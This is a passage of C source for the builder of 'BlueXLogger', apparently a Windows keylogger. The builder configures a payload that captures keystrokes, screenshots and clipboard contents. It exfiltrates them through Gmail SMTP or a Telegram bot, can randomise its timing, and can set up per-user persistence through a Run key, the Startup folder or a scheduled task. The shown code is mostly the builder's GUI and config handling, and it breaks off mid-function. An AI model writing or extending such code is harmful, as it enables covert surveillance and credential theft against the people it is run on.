/*============================================================================
 * BlueXLogger - src/builder/state.c
 * Control table, config<->form mapping, validation and the build log panel.
 *
 * Created by Xencode-CLI by xanthorox
 *
 * Layout model
 * ------------
 * A single static table describes every control: its id, which page it lives
 * on, its rectangle in design units relative to the content area, its kind,
 * and the label and hint text painted around it.
 *
 * The rectangle in the table is the *well* - the rounded dark field the
 * operator sees. The stock EDIT that sits inside it is inset by three pixels
 * so that it can never paint over the rounded corners or the 1px frame.
 * That inset is why the corners stay clean despite EDIT being rectangular.
 *==========================================================================*/
#include "state.h"
#include "ui_theme.h"
#include "ui_widget.h"
#include "bxl_branding.h"
#include "bxl_identity.h"
#include "bxl_telegram.h"
#include <wctype.h>

/*----------------------------------------------------------------------------
 * The control table
 *--------------------------------------------------------------------------*/
/* Rows start at BLD_FIRST_ROW so the page title and note strip above them is
 * never overdrawn; each subsequent row is 70 units lower. The y here is
 * relative to the content origin (see state.h), as are x and the widths. */
static BxlCtl g_ctl[] = {
/*  id              page   x    y    w    h  kind      label                    hint  seg_labels */
/* ---- Delivery --------------------------------------------------------- */
{ IDC_CHANNEL,     0,   30, 106, 460,  32, CK_SEG,  L"Delivery channel",       NULL,
                                                    L"Gmail (SMTP)|Telegram bot|Both", 0 },
{ IDC_RECIPIENT,   0,   30, 186, 380,  32, CK_EDIT, L"Recipient Gmail address",  NULL, NULL, 0 },
{ IDC_SENDER,      0,  440, 186, 380,  32, CK_EDIT, L"Sender Gmail address",     NULL, NULL, 0 },
{ IDC_APPPASS,     0,   30, 256, 270,  32, CK_EDIT, L"Google App Password",     NULL, NULL, 0 },
{ IDC_SHOWPASS,    0,  312, 262, 162,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_AUTHEN,      0,  486, 260, 348,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_SMTPHOST,    0,   30, 326, 290,  32, CK_EDIT, L"SMTP host",               NULL, NULL, 0 },
{ IDC_SMTPPORT,    0,  340, 326, 110,  32, CK_EDIT, L"Port",                    NULL, NULL, 0 },
{ IDC_TLSMODE,     0,  470, 326, 350,  32, CK_SEG,  L"TLS mode",                NULL,
                                                    L"Implicit 465|STARTTLS 587|None", 0 },
{ IDC_SUBJECT,     0,   30, 396, 380,  32, CK_EDIT, L"Subject prefix",          NULL, NULL, 0 },
{ IDC_HTMLBODY,    0,  440, 400, 380,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_SEPARATE,    0,  440, 428, 380,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },

/* ---- Telegram --------------------------------------------------------- */
{ IDC_TGTOKEN,     1,   30, 106, 730,  32, CK_EDIT, L"Bot token (from @BotFather)", NULL,
                                                    L"Looks like 8123456789:AAH... - not the bot's @username.", 0 },
{ IDC_TGCHAT,      1,   30, 186, 380,  32, CK_EDIT, L"Chat ID or @channel",    NULL,
                                                    L"Numeric id, or @channel the bot administers.", 0 },
{ IDC_TGVERIFY,    1,  440, 186, 150,  32, CK_BTN,  L"Verify bot",             NULL, NULL, 0 },
{ IDC_TGDEMO,      1,  610, 186, 150,  32, CK_BTN,  L"Send test message",      NULL, NULL, 0 },
{ IDC_TGHTML,      1,   30, 266, 400,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_TGSHOTS,     1,   30, 298, 400,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_TGFULL,      1,   30, 330, 400,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },

/* ---- Schedule --------------------------------------------------------- */
{ IDC_LOGINT,      2,   30, 106, 220,  32, CK_EDIT, L"Log digest interval (minutes)", NULL, NULL, 0 },
{ IDC_LOGKEYS,     2,  290, 106, 220,  32, CK_EDIT, L"Log keystroke threshold",       NULL, NULL, 0 },
{ IDC_SHOTEN,      2,   30, 178, 300,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_SHOTINT,     2,  440, 176, 220,  32, CK_EDIT, L"Screenshot interval (minutes)", NULL, NULL, 0 },
{ IDC_DAILYEN,     2,   30, 248, 300,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_DAILYTIME,   2,  440, 246, 220,  32, CK_EDIT, L"Daily report time (HH:MM)",    NULL, NULL, 0 },
{ IDC_JITTEREN,    2,   30, 318, 300,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_JITTERPCT,   2,  440, 316, 220,  32, CK_EDIT, L"Jitter (+/- percent)",         NULL, NULL, 0 },

/* ---- Capture ---------------------------------------------------------- */
{ IDC_MONITORS,    3,   30, 106, 340,  32, CK_SEG,  L"Monitors to capture",     NULL,
                                                    L"All monitors|Primary only", 0 },
{ IDC_SHOTFMT,     3,  440, 106, 340,  32, CK_SEG,  L"Image format",            NULL,
                                                    L"PNG|JPEG", 0 },
{ IDC_JPEGQ,       3,   30, 176, 220,  32, CK_EDIT, L"JPEG quality (1-100)",     NULL, NULL, 0 },
{ IDC_MAXDIM,      3,  290, 176, 220,  32, CK_EDIT, L"Max dimension (px, 0 = full)", NULL, NULL, 0 },
{ IDC_MAXCOUNT,    3,  550, 176, 220,  32, CK_EDIT, L"Max shots per batch",      NULL, NULL, 0 },
{ IDC_CLIP,        3,   30, 248, 340,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_RAWIN,       3,  440, 248, 340,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_SINGLE,      3,   30, 280, 340,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_DEBUGLOG,    3,  440, 280, 340,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
/* The hotkey edit carries a painted label, and labels are drawn in the 20
 * design units directly above the control. This row therefore has to start
 * clear of the checkbox band that ends at 302, or the two overlap. */
{ IDC_HOTKEYEN,    3,   30, 328, 340,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_HOTKEY,      3,  440, 326, 340,  32, CK_EDIT, L"Pause hotkey",            NULL, NULL, 0 },

/* ---- Advanced --------------------------------------------------------- */
{ IDC_PERSIST,     4,   30, 106, 340,  32, CK_SEG,  L"Persistence (OFF by default)", NULL,
                                                    L"Off|Run key|Startup folder|Scheduled task", 0 },
{ IDC_STORAGEDIR,  4,   30, 176, 520,  32, CK_EDIT, L"Storage directory (blank = %TEMP%\\BlueXLogger)", NULL, NULL, 0 },
{ IDC_BROWSEDIR,   4,  560, 176, 120,  32, CK_BTN,  NULL,                       NULL, NULL, 0 },
{ IDC_RETENTION,   4,   30, 246, 220,  32, CK_EDIT, L"Retention (days, 0 = keep)", NULL, NULL, 0 },
{ IDC_MAXATTACH,   4,  290, 246, 220,  32, CK_EDIT, L"Max attachment size (MB)",  NULL, NULL, 0 },
{ IDC_OUTDIR,      4,   30, 316, 520,  32, CK_EDIT, L"Output folder",           NULL, NULL, 0 },
{ IDC_BROWSEOUT,   4,  560, 316, 120,  32, CK_BTN,  NULL,                       NULL, NULL, 0 },
{ IDC_OUTNAME,     4,   30, 386, 380,  32, CK_EDIT, L"Output filename",         NULL, NULL, 0 },
/* A way to stop the payload without Task Manager. Ending the process from
 * Task Manager skips the shutdown path - no spool flush and no final delivery
 * attempt - so this exists to make a clean stop possible. */
{ IDC_QUITHOTKEYEN,4,   30, 456, 340,  22, CK_CHK,  NULL,                       NULL, NULL, 0 },
{ IDC_QUITHOTKEY,  4,  440, 454, 340,  32, CK_EDIT, L"Quit hotkey",             NULL, NULL, 0 },

/* ---- Build ------------------------------------------------------------ */
{ IDC_SUMMARY,     5,   30, 106, 730, 160, CK_MULTI, L"Configuration summary",  NULL, NULL, 0 },
{ IDC_LOG,         5,   30, 296, 730, 330, CK_MULTI, L"Build log",              NULL, NULL, 0 },
};

#define CTL_COUNT ((int)(sizeof(g_ctl) / sizeof(g_ctl[0])))

static HWND g_parent;
static HWND g_log;

/* Builder-local output settings. These are not part of BxlConfig: where the
 * builder writes its result is a property of the operator's session, not of
 * the payload. */
static wchar_t g_out_dir[MAX_PATH * 2];
static wchar_t g_out_name[MAX_PATH];

/* Status line state, painted by the main window. */
static wchar_t g_status[512] = L"Ready.";
static int     g_status_kind = 0;

/*----------------------------------------------------------------------------
 * Table access
 *--------------------------------------------------------------------------*/
const BxlCtl *bld_ctl_table(int *count_out)
{
    if (count_out) *count_out = CTL_COUNT;
    return g_ctl;
}

HWND bld_ctl(int id)
{
    int i;
    for (i = 0; i < CTL_COUNT; i++)
        if (g_ctl[i].id == id) return g_ctl[i].hwnd;
    return NULL;
}

/* Invalid flags live here, not in the widgets: stock EDIT controls have no
 * widget state to hang a flag on, and the parent needs one uniform way to
 * ask "should this field be outlined in red?". Ids run from 1001 and the
 * Telegram page uses the 16xx block, so the table has to reach that far. */
#define INV_BASE 1000
#define INV_MAX  2048
static unsigned char g_invalid[INV_MAX];

void bld_mark_invalid(int id, int invalid)
{
    int idx = id - INV_BASE;
    if (idx < 0 || idx >= INV_MAX) return;
    g_invalid[idx] = invalid ? 1 : 0;
    ui_set_invalid(bld_ctl(id), invalid);
}

int bld_is_invalid(int id)
{
    int idx = id - INV_BASE;
    if (idx < 0 || idx >= INV_MAX) return 0;
    return g_invalid[idx];
}

void bld_clear_invalid(void)
{
    int i;
    memset(g_invalid, 0, sizeof(g_invalid));
    for (i = 0; i < CTL_COUNT; i++) ui_set_invalid(g_ctl[i].hwnd, 0);
}

/*----------------------------------------------------------------------------
 * Creation
 *--------------------------------------------------------------------------*/
static HWND create_one(BxlCtl *c)
{
    HWND h = NULL;

    switch (c->kind) {
    case CK_EDIT:
        h = CreateWindowExW(0, L"EDIT", L"",
                            WS_CHILD | WS_VISIBLE | WS_TABSTOP | ES_AUTOHSCROLL,
                            0, 0, 10, 10, g_parent,
                            (HMENU)(INT_PTR)c->id, GetModuleHandleW(NULL), NULL);
        if (h) SendMessageW(h, WM_SETFONT, (WPARAM)g_font.body, TRUE);
        if (h) SendMessageW(h, EM_SETLIMITTEXT, 1000, 0);
        break;

    case CK_MULTI:
        h = CreateWindowExW(0, L"EDIT", L"",
                            WS_CHILD | WS_VISIBLE | WS_TABSTOP | WS_VSCROLL |
                            ES_MULTILINE | ES_READONLY | ES_AUTOVSCROLL |
                            ES_LEFT,
                            0, 0, 10, 10, g_parent,
                            (HMENU)(INT_PTR)c->id, GetModuleHandleW(NULL), NULL);
        if (h) SendMessageW(h, WM_SETFONT, (WPARAM)g_font.mono, TRUE);
        /* A stock scrollbar is drawn in the light system colours and reads as
         * a bright stripe against this palette. */
        if (h) ui_dark_scrollbars(h);
        break;

    case CK_CHK:
        h = ui_make_check(g_parent, c->id, L"", 0);
        if (h) SendMessageW(h, WM_SETFONT, (WPARAM)g_font.body, TRUE);
        break;

    case CK_SEG:
        h = ui_make_seg(g_parent, c->id, c->seg_labels ? c->seg_labels : L"", 0);
        if (h) SendMessageW(h, WM_SETFONT, (WPARAM)g_font.body, TRUE);
        break;

    default: /* CK_BTN */
        /* For a button the label doubles as its caption, so the two do not
         * have to be kept in sync in the table; a NULL label keeps the
         * generic caption used by the folder pickers. */
        h = ui_make_button(g_parent, c->id,
                           c->label ? c->label : L"Browse",
                           UI_BTN_SECONDARY);
        if (h) SendMessageW(h, WM_SETFONT, (WPARAM)g_font.body, TRUE);
        break;
    }

    c->hwnd = h;
    return h;
}

void bld_controls_create(HWND parent)
{
    int i;

    g_parent = parent;

    for (i = 0; i < CTL_COUNT; i++) create_one(&g_ctl[i]);

    /* Initial states that never change; push() overwrites the rest. */
    SetWindowTextW(bld_ctl(IDC_SHOWPASS), L"Show password");
    SetWindowTextW(bld_ctl(IDC_AUTHEN), L"Require SMTP authentication");
    SetWindowTextW(bld_ctl(IDC_SHOTEN), L"Capture screenshots");
    SetWindowTextW(bld_ctl(IDC_DAILYEN), L"Daily consolidated report");
    SetWindowTextW(bld_ctl(IDC_JITTEREN), L"Randomise timing (jitter)");
    SetWindowTextW(bld_ctl(IDC_CLIP), L"Capture clipboard on Ctrl+C");
    SetWindowTextW(bld_ctl(IDC_RAWIN), L"Raw Input (WM_INPUT) fallback");
    SetWindowTextW(bld_ctl(IDC_SINGLE), L"Single instance only");
    SetWindowTextW(bld_ctl(IDC_DEBUGLOG), L"Write a local debug log");
    SetWindowTextW(bld_ctl(IDC_HOTKEYEN), L"Enable the pause hotkey");
    SetWindowTextW(bld_ctl(IDC_QUITHOTKEYEN),
                   L"Enable the quit hotkey (clean stop)");
    SetWindowTextW(bld_ctl(IDC_HTMLBODY), L"Include an HTML alternative part");
    SetWindowTextW(bld_ctl(IDC_SEPARATE), L"Send logs and screenshots separately");
    SetWindowTextW(bld_ctl(IDC_TGHTML),
                   L"Format the digest with Telegram HTML (bold header, monospaced log)");
    SetWindowTextW(bld_ctl(IDC_TGSHOTS),
                   L"Attach screenshots to the chat (album when there is more than one)");
    SetWindowTextW(bld_ctl(IDC_TGFULL),
                   L"Attach the full log as a .txt file (tap to open in Telegram, or download)");

    /* Sensible starting values for the builder-local output settings. The
     * result goes into an "output" subfolder rather than next to the builder:
     * the builder sits in build\bin beside the unconfigured payload template,
     * and defaulting to the same directory would overwrite that template on
     * the operator's very first build. Keeping the two apart means the
     * template stays reusable and the deliverable is easy to find. */
    if (!g_out_dir[0]) {
        wchar_t exe[MAX_PATH * 2];
        wchar_t dir[MAX_PATH * 2];
        wchar_t *slash;

        dir[0] = 0;
        if (bxl_path_exe(exe, BXL_COUNT_OF(exe))) {
            slash = wcsrchr(exe, L'\\');
            if (slash) *slash = 0;
            bxl_path_join(dir, BXL_COUNT_OF(dir), exe, L"output");
        }
        StringCchCopyW(g_out_dir, BXL_COUNT_OF(g_out_dir),
                       dir[0] ? dir : L"output");
        StringCchCopyW(g_out_name, BXL_COUNT_OF(g_out_name), L"BlueXLogger.exe");
    }

    g_log = bld_ctl(IDC_LOG);
}

/*----------------------------------------------------------------------------
 * Layout
 *--------------------------------------------------------------------------*/
void bld_controls_layout(HWND parent, int page, int content_w, int content_h)
{
    int i;

    BXL_UNUSED(page);
    BXL_UNUSED(content_w);
    BXL_UNUSED(content_h);
    BXL_UNUSED(parent);

    for (i = 0; i < CTL_COUNT; i++) {
        BxlCtl *c = &g_ctl[i];
        int x, y, w, h;

        if (!c->hwnd) continue;

        /* Table coordinates are content-relative; shift them past the nav
         * rail and below the header before handing them to the window. */
        x = ui_scale(c->x + BLD_CONTENT_X);
        y = ui_scale(c->y + BLD_CONTENT_Y);
        w = ui_scale(c->w);
        h = ui_scale(c->h);

        /* Stock controls are inset so they cannot paint over the rounded
         * well drawn by the parent. Owner-drawn widgets get the full rect. */
        if (c->kind == CK_EDIT || c->kind == CK_MULTI) {
            int inset = ui_scale(3);
            MoveWindow(c->hwnd, x + inset, y + inset,
                       w - inset * 2, h - inset * 2, TRUE);
        } else {
            MoveWindow(c->hwnd, x, y, w, h, TRUE);
        }
    }
}

void bld_controls_show_page(HWND parent, int page)
{
    int i;
    BXL_UNUSED(parent);

    for (i = 0; i < CTL_COUNT; i++) {
        if (!g_ctl[i].hwnd) continue;
        ShowWindow(g_ctl[i].hwnd,
                   g_ctl[i].page == page ? SW_SHOW : SW_HIDE);
    }
}

/*----------------------------------------------------------------------------
 * Painting: page title, labels, hints and the input wells
 *--------------------------------------------------------------------------*/
static const wchar_t *page_title(int page)
{
    switch (page) {
    case PAGE_DELIVERY: return L"Delivery";
    case PAGE_TELEGRAM: return L"Telegram";
    case PAGE_SCHEDULE: return L"Schedule";
    case PAGE_CAPTURE:  return L"Capture";
    case PAGE_ADVANCED: return L"Advanced";
    default:            return L"Build";
    }
}

static const wchar_t *page_note(int page)
{
    switch (page) {
    case PAGE_DELIVERY:
        return L"Choose how the payload delivers. Gmail needs a 16-character App "
               L"Password from an account with 2-Step Verification; Telegram needs "
               L"a bot token and a chat id, which take a minute to obtain and have "
               L"no mail-provider policy in the way.";
    case PAGE_TELEGRAM:
        return L"Create a bot by messaging @BotFather, paste the token it gives "
               L"you, then send your new bot a message and use Verify to confirm. "
               L"The chat id may be a number such as -1001234567890 or a channel "
               L"the bot administers, such as @mychannel.";
    case PAGE_SCHEDULE:
        return L"There is never one email per keystroke. The log digest is sent when the "
               L"interval elapses OR the keystroke threshold is reached, whichever happens "
               L"first. The screenshot interval runs independently.";
    case PAGE_CAPTURE:
        return L"Raw Input only feeds the log when the low-level hook has stopped "
               L"delivering events, so the two paths can never double-log a keystroke.";
    case PAGE_ADVANCED:
        return L"Persistence is OFF by default and must be chosen deliberately. When set, "
               L"the payload installs a per-user autostart entry - no elevation required.";
    default:
        return L"Build copies the template, patches the configuration into the fixed-size "
               L"BXL_CFG resource slot in place, and verifies the result by reading it back. "
               L"No compiler is needed on this machine.";
    }
}

void bld_paint_page(HWND parent, HDC dc, int page, int content_w, int content_h)
{
    RECT r;
    int  i;
    BXL_UNUSED(parent);
    BXL_UNUSED(content_w);
    BXL_UNUSED(content_h);

    /* ---- page heading --------------------------------------------------- */
    r.left  = ui_scale(BLD_CONTENT_X + 30);
    r.right = r.left + ui_scale(BLD_CONTENT_W - 60);
    r.top   = ui_scale(BLD_CONTENT_Y + BLD_TITLE_Y);
    r.bottom = r.top + ui_scale(BLD_TITLE_H);
    ui_text(dc, &r, page_title(page), g_font.h1, g_pal.text,
            DT_LEFT | DT_BOTTOM | DT_SINGLELINE);

    r.top    = ui_scale(BLD_CONTENT_Y + BLD_NOTE_Y);
    r.bottom = r.top + ui_scale(BLD_NOTE_H);
    ui_text(dc, &r, page_note(page), g_font.hint, g_pal.text_dim,
            DT_LEFT | DT_TOP | DT_WORDBREAK | DT_NOCLIP);

    /* ---- per-control chrome --------------------------------------------- */
    for (i = 0; i < CTL_COUNT; i++) {
        BxlCtl *c = &g_ctl[i];
        RECT well, lbl;
        COLORREF fill, edge;

        if (c->page != page) continue;

        well.left   = ui_scale(c->x + BLD_CONTENT_X);
        well.top    = ui_scale(c->y + BLD_CONTENT_Y);
        well.right  = well.left + ui_scale(c->w);
        well.bottom = well.top  + ui_scale(c->h);

        if (c->kind == CK_EDIT || c->kind == CK_MULTI) {
            int invalid = bld_is_invalid(c->id);

            fill = (c->kind == CK_MULTI) ? g_pal.header : g_pal.surface_hi;
            edge = invalid ? g_pal.err : g_pal.border_soft;

            ui_fill_round(dc, &well, ui_scale(6), fill);
            ui_frame_round(dc, &well, ui_scale(6), edge, invalid ? 2 : 1);
        }

        if (c->label) {
            lbl.left   = well.left;
            lbl.right  = well.right;
            lbl.top    = well.top - ui_scale(20);
            lbl.bottom = well.top - ui_scale(2);
            ui_text(dc, &lbl, c->label, g_font.hint,
                    bld_is_invalid(c->id) ? g_pal.err : g_pal.text_dim,
                    DT_LEFT | DT_BOTTOM | DT_SINGLELINE);
        }

        if (c->hint) {
            lbl.left = well.left; lbl.right = well.right;
            lbl.top = well.bottom + ui_scale(2);
            lbl.bottom = lbl.top + ui_scale(16);
            ui_text(dc, &lbl, c->hint, g_font.hint, g_pal.text_faint,
                    DT_LEFT | DT_TOP | DT_SINGLELINE);
        }
    }
}

/*----------------------------------------------------------------------------
 * Log panel and status line
 *--------------------------------------------------------------------------*/
void bld_log_attach(HWND log_edit)
{
    g_log = log_edit;
}

void bld_log_clear(void)
{
    if (g_log) SetWindowTextW(g_log, L"");
}

void bld_log(const wchar_t *fmt, ...)
{
    wchar_t line[1024];
    va_list ap;
    int     n;

    if (!g_log) return;

    va_start(ap, fmt);
    n = _vsnwprintf_s(line, BXL_COUNT_OF(line), _TRUNCATE, fmt, ap);
    va_end(ap);
    if (n < 0) line[BXL_COUNT_OF(line) - 2] = 0;

    {
        int len = GetWindowTextLengthW(g_log);
        SendMessageW(g_log, EM_SETSEL, (WPARAM)len, (LPARAM)len);
        SendMessageW(g_log, EM_REPLACESEL, FALSE, (LPARAM)line);
        SendMessageW(g_log, EM_REPLACESEL, FALSE, (LPARAM)L"\r\n");
        SendMessageW(g_log, EM_SCROLLCARET, 0, 0);
    }
}

void bld_status(const wchar_t *fmt, int kind, ...)
{
    va_list ap;
    va_start(ap, kind);
    _vsnwprintf_s(g_status, BXL_COUNT_OF(g_status), _TRUNCATE, fmt, ap);
    va_end(ap);
    g_status_kind = kind;
    if (g_parent) InvalidateRect(g_parent, NULL, FALSE);
}

const wchar_t *bld_status_text(int *kind_out)
{
    if (kind_out) *kind_out = g_status_kind;
    return g_status;
}

/*----------------------------------------------------------------------------
 * Config <-> form
 *--------------------------------------------------------------------------*/
void bld_state_defaults(BxlConfig *cfg)
{
    bxl_config_defaults(cfg);
}

/* Read a control's UTF-8 text. */
static void get_utf8(int id, char *out, size_t out_cch)
{
    wchar_t w[1024];
    w[0] = 0;
    if (bld_ctl(id)) GetWindowTextW(bld_ctl(id), w, (int)BXL_COUNT_OF(w));
    bxl_wide_to_utf8(w, out, out_cch);
}

static void set_utf8(int id, const char *utf8)
{
    wchar_t w[1024];
    if (!bld_ctl(id)) return;
    if (!bxl_utf8_to_wide(utf8, w, BXL_COUNT_OF(w))) w[0] = 0;
    SetWindowTextW(bld_ctl(id), w);
}

/* Parse a numeric field. An empty field yields `def`. Returns BXL_FALSE when
 * the text is not a number or falls outside [lo, hi]. */
static int get_num(int id, long lo, long hi, long def, long *out)
{
    wchar_t w[64];
    wchar_t *end = NULL;
    long    v;

    w[0] = 0;
    if (bld_ctl(id)) GetWindowTextW(bld_ctl(id), w, (int)BXL_COUNT_OF(w));
    if (!w[0]) { *out = def; return BXL_TRUE; }

    v = wcstol(w, &end, 10);
    if (end == w || (end && *end != 0 && *end != L' ')) return BXL_FALSE;
    if (v < lo || v > hi) return BXL_FALSE;
    *out = v;
    return BXL_TRUE;
}

static void set_num(int id, long v)
{
    wchar_t w[32];
    StringCchPrintfW(w, BXL_COUNT_OF(w), L"%ld", v);
    if (bld_ctl(id)) SetWindowTextW(bld_ctl(id), w);
}

/*----------------------------------------------------------------------------
 * Pause hotkey text <-> (mods, vk)
 *--------------------------------------------------------------------------*/
static void hotkey_to_text(bxl_u8 mods, bxl_u8 vk, wchar_t *out, size_t cch)
{
    wchar_t key[16];

    out[0] = 0;
    if (!vk) return;

    if (vk >= 'A' && vk <= 'Z')            StringCchPrintfW(key, 16, L"%c", (wchar_t)vk);
    else if (vk >= '0' && vk <= '9')       StringCchPrintfW(key, 16, L"%c", (wchar_t)vk);
    else if (vk >= VK_F1 && vk <= VK_F12)  StringCchPrintfW(key, 16, L"F%u", (unsigned)(vk - VK_F1 + 1));
    else                                   StringCchPrintfW(key, 16, L"0x%02X", (unsigned)vk);

    if (mods & MOD_CONTROL) StringCchCatW(out, cch, L"Ctrl+");
    if (mods & MOD_ALT)     StringCchCatW(out, cch, L"Alt+");
    if (mods & MOD_SHIFT)   StringCchCatW(out, cch, L"Shift+");
    if (mods & MOD_WIN)     StringCchCatW(out, cch, L"Win+");
    StringCchCatW(out, cch, key);
}

static int hotkey_from_text(const wchar_t *s, bxl_u8 *mods, bxl_u8 *vk)
{
    wchar_t buf[128];
    wchar_t *ctx = NULL, *tok;
    bxl_u8  m = 0;
    bxl_u8  v = 0;
    int     seen_key = 0;

    StringCchCopyW(buf, BXL_COUNT_OF(buf), s);

    tok = wcstok(buf, L"+ ", &ctx);
    while (tok) {
        if      (!_wcsicmp(tok, L"ctrl") || !_wcsicmp(tok, L"control")) m |= MOD_CONTROL;
        else if (!_wcsicmp(tok, L"alt"))                                m |= MOD_ALT;
        else if (!_wcsicmp(tok, L"shift"))                              m |= MOD_SHIFT;
        else if (!_wcsicmp(tok, L"win"))                                m |= MOD_WIN;
        else if (wcslen(tok) == 1 &&
                 ((tok[0] >= L'A' && tok[0] <= L'Z') ||
                  (tok[0] >= L'a' && tok[0] <= L'z') ||
                  (tok[0] >= L'0' && tok[0] <= L'9'))) {
            wchar_t c = tok[0];
            if (c >= L'a' && c <= L'z') c = (wchar_t)(c - L'a' + L'A');
            v = (bxl_u8)c;
            seen_key = 1;
        }
        else if ((tok[0] == L'F' || tok[0] == L'f') && iswdigit(tok[1])) {
            int n = _wtoi(tok + 1);
            if (n >= 1 && n <= 12) { v = (bxl_u8)(VK_F1 + n - 1); seen_key = 1; }
        }
        tok = wcstok(NULL, L"+ ", &ctx);
    }

    if (!seen_key) return BXL_FALSE;
    *mods = m;
    *vk   = v;
    return BXL_TRUE;
}

/*----------------------------------------------------------------------------
 * TLS mode -> port
 *--------------------------------------------------------------------------*/
/*
 * The TLS segments are labelled with the port each mode expects - "Implicit
 * 465" and "STARTTLS 587" - so choosing one has to move the port with it.
 * Leaving the port behind is what produces the dead combination the operator
 * hit: mode STARTTLS, port 465, nothing said, socket timeout.
 *
 * A port the operator typed themselves is left alone. Only the three values
 * the modes actually advertise are treated as "still on the default", so a
 * deliberate choice such as a relay on 2525 survives flipping the mode.
 */
void bld_tls_mode_changed(void)
{
    static const long mode_port[] = { 465, 587, 25 };   /* BXL_TLS_* order */
    wchar_t cur[16];
    long    port;
    int     mode = ui_seg_get_sel(bld_ctl(IDC_TLSMODE));

    if (mode < 0 || mode > BXL_TLS_NONE) return;

    cur[0] = 0;
    GetWindowTextW(bld_ctl(IDC_SMTPPORT), cur, (int)BXL_COUNT_OF(cur));
    port = wcstol(cur, NULL, 10);

    /* 0 means the field was empty or unparseable: fill in the default rather
     * than leaving the operator staring at a blank. */
    if (port == 0 || port == 465 || port == 587 || port == 25)
        set_num(IDC_SMTPPORT, mode_port[mode]);

    bld_mark_invalid(IDC_SMTPPORT, 0);
}

/*----------------------------------------------------------------------------
 * Delivery channel
 *--------------------------------------------------------------------------*/
int bld_channel_current(void)
{
    int sel = ui_seg_get_sel(bld_ctl(IDC_CHANNEL));
    if (sel < BXL_CHANNEL_EMAIL || sel > BXL_CHANNEL_BOTH) return BXL_CHANNEL_EMAIL;
    return sel;
}

/*
 * Selecting a channel only changes which fields matter, so the handler's job is
 * to say so plainly and refresh the summary. The footer test buttons are
 * relabelled by the main window, which owns them; it reads
 * bld_channel_current() rather than being told here.
 */
void bld_channel_changed(void)
{
    int ch = bld_channel_current();

    /* A stale red mark on a field that is no longer part of the chosen channel
     * reads as a validation failure the operator cannot clear. */
    if (ch != BXL_CHANNEL_TELEGRAM) {
        bld_mark_invalid(IDC_RECIPIENT, 0);
        bld_mark_invalid(IDC_SENDER, 0);
        bld_mark_invalid(IDC_APPPASS, 0);
        bld_mark_invalid(IDC_SMTPHOST, 0);
        bld_mark_invalid(IDC_SMTPPORT, 0);
    }
    if (ch != BXL_CHANNEL_EMAIL) {
        bld_mark_invalid(IDC_TGTOKEN, 0);
        bld_mark_invalid(IDC_TGCHAT, 0);
    }

    bld_state_summary();
    InvalidateRect(g_parent, NULL, FALSE);
}

/*----------------------------------------------------------------------------
 * Push / pull
 *--------------------------------------------------------------------------*/
void bld_state_push(const BxlConfig *cfg)
{
    wchar_t hk[64];

    /* Delivery */
    set_utf8(IDC_RECIPIENT, cfg->recipient);
    set_utf8(IDC_SENDER, cfg->sender);
    set_utf8(IDC_APPPASS, cfg->app_password);
    ui_set_check(bld_ctl(IDC_AUTHEN), cfg->auth_enabled);
    set_utf8(IDC_SMTPHOST, cfg->smtp_host);
    set_num(IDC_SMTPPORT, cfg->smtp_port);
    ui_seg_set_sel(bld_ctl(IDC_TLSMODE), cfg->tls_mode);
    set_utf8(IDC_SUBJECT, cfg->subject_prefix);
    ui_set_check(bld_ctl(IDC_HTMLBODY), cfg->html_body);
    ui_set_check(bld_ctl(IDC_SEPARATE), cfg->separate_emails);
    ui_set_check(bld_ctl(IDC_SHOWPASS), 0);
    SendMessageW(bld_ctl(IDC_APPPASS), EM_SETPASSWORDCHAR, (WPARAM)L'\x25CF', 0);
    InvalidateRect(bld_ctl(IDC_APPPASS), NULL, TRUE);

    /* Telegram */
    ui_seg_set_sel(bld_ctl(IDC_CHANNEL), cfg->channel);
    set_utf8(IDC_TGTOKEN, cfg->tg_bot_token);
    set_utf8(IDC_TGCHAT, cfg->tg_chat_id);
    ui_set_check(bld_ctl(IDC_TGHTML), cfg->tg_parse_html);
    ui_set_check(bld_ctl(IDC_TGSHOTS), cfg->tg_send_screenshots);
    ui_set_check(bld_ctl(IDC_TGFULL), cfg->tg_full_log_file);

    /* Schedule */
    set_num(IDC_LOGINT, cfg->log_interval_min);
    set_num(IDC_LOGKEYS, cfg->log_keystroke_threshold);
    ui_set_check(bld_ctl(IDC_SHOTEN), cfg->shot_enabled);
    set_num(IDC_SHOTINT, cfg->shot_interval_min);
    ui_set_check(bld_ctl(IDC_DAILYEN), cfg->daily_enabled);
    {
        wchar_t t[16];
        StringCchPrintfW(t, BXL_COUNT_OF(t), L"%02u:%02u",
                         (unsigned)cfg->daily_hour, (unsigned)cfg->daily_minute);
        SetWindowTextW(bld_ctl(IDC_DAILYTIME), t);
    }
    ui_set_check(bld_ctl(IDC_JITTEREN), cfg->jitter_enabled);
    set_num(IDC_JITTERPCT, cfg->jitter_percent);

    /* Capture */
    ui_seg_set_sel(bld_ctl(IDC_MONITORS), cfg->shot_monitors);
    ui_seg_set_sel(bld_ctl(IDC_SHOTFMT), cfg->shot_format);
    set_num(IDC_JPEGQ, cfg->shot_jpeg_quality);
    set_num(IDC_MAXDIM, cfg->shot_max_dim);
    set_num(IDC_MAXCOUNT, cfg->shot_max_count);
    ui_set_check(bld_ctl(IDC_CLIP), cfg->clipboard_capture);
    ui_set_check(bld_ctl(IDC_RAWIN), cfg->capture_raw_input);
    ui_set_check(bld_ctl(IDC_SINGLE), cfg->single_instance);
    ui_set_check(bld_ctl(IDC_DEBUGLOG), cfg->debug_log);
    ui_set_check(bld_ctl(IDC_HOTKEYEN), cfg->hotkey_enabled);
    hotkey_to_text(cfg->hotkey_mods, cfg->hotkey_vk, hk, BXL_COUNT_OF(hk));
